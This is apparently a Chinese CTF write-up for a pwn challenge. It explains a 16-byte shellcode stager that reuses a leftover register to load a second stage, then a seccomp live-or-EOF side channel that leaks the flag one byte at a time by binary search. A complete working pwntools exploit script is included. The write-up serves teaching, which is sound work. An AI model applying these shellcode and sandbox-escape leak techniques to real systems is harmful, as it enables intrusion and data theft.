# 爱你在心口难开

## 题目简述

程序在固定地址 `0x20230000` 映射一页 RWX 内存，但第一阶段只允许写入 16 字节。安装 seccomp 后，进程只允许 `read` 和 `open`，无法通过 `write` 回显 flag。目标是先用极短 shellcode 读入第二阶段，再把“进程仍存活”与“连接收到 EOF”作为一比特侧信道逐字节恢复 flag。

## 解题过程

### 16 字节第一阶段

调用 shellcode 前，反汇编显示程序执行：

```asm
mov rdx, [rbp-0x8]  ; rdx = 0x20230000
call rdx
```

因此入口时 `rdx` 恰好保存 RWX 页地址。第一阶段把它同时复制到 `rsi` 和 `r15`，再执行 `read(0, 0x20230000, rdx)`：

```asm
push rdx
pop rsi
push rdx
pop r15
xor rdi, rdi
xor rax, rax
syscall
```

这段机器码不超过 16 字节。第二次 `read` 会从页首覆盖第一阶段；保存于 `r15` 的基址供后续 `open` 使用。由于 `read` 返回时 `rip` 位于第一阶段末尾，第二阶段的前 16 字节先放 `flag\0` 并用 NOP 补齐，执行流会自然滑到偏移 `0x10` 的主体 shellcode。

### 构造存活/EOF oracle

第二阶段执行以下逻辑：

1. `open("flag", 0)`，取得文件描述符；
2. `read(fd, 0x20230600, 0x100)`，把 flag 读入内存；
3. 比较目标字节与猜测中点；
4. 若真实字节大于中点，则进入死循环，连接在短超时内仍存活；
5. 否则执行被 seccomp 禁止的 `execve`，进程被杀死，客户端收到 EOF。

于是每次连接泄露“目标字节是否大于 `mid`”，可以在可打印 ASCII 范围内二分。

```python
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = "info"

if not args.HOST or not args.PORT:
    raise SystemExit("usage: python exp.py HOST=<host> PORT=<port>")

stage0 = asm(
    "push rdx; pop rsi; "
    "push rdx; pop r15; "
    "xor rdi, rdi; xor rax, rax; syscall"
)
assert len(stage0) <= 16


def greater_than(position, middle):
    io = remote(args.HOST, int(args.PORT))
    io.sendafter(b"code:\n", stage0)

    stage1 = asm(f"""
        push r15
        pop rdi
        xor rsi, rsi
        xor rdx, rdx
        push 2
        pop rax
        syscall

        push rdi
        pop rsi
        add rsi, 0x600
        push rax
        pop rdi
        xor rax, rax
        inc dh
        syscall

        push rsi
        pop r14
        cmp byte ptr [r14 + {position}], {middle}
        ja alive

        push 59
        pop rax
        syscall

    alive:
        jmp alive
    """)

    io.recvuntil(b"machanism...\n")
    io.send(b"flag\x00".ljust(0x10, b"\x90") + stage1)

    try:
        io.recv(timeout=0.7)
        result = True       # 未收到 EOF：真实字节 > middle
    except EOFError:
        result = False      # 禁止的 syscall 杀死进程：真实字节 <= middle
    io.close()
    return result


flag = "0xGame{"
while not flag.endswith("}"):
    left, right = 32, 126
    while left < right:
        middle = (left + right) // 2
        if greater_than(len(flag), middle):
            left = middle + 1
        else:
            right = middle
    flag += chr(left)
    log.success(flag)
```

## 方法总结

没有 `write` 并不等于完全没有输出通道。该题先利用调用点遗留的 `rdx=RWX 基址` 在 16 字节内完成二次读入，再用 seccomp 的“允许时持续运行、禁止时立即杀死”制造可观测的连接状态差异。对每个字符做二分只需约 $\lceil\log_2 95\rceil=7$ 次连接，显著少于逐值枚举。
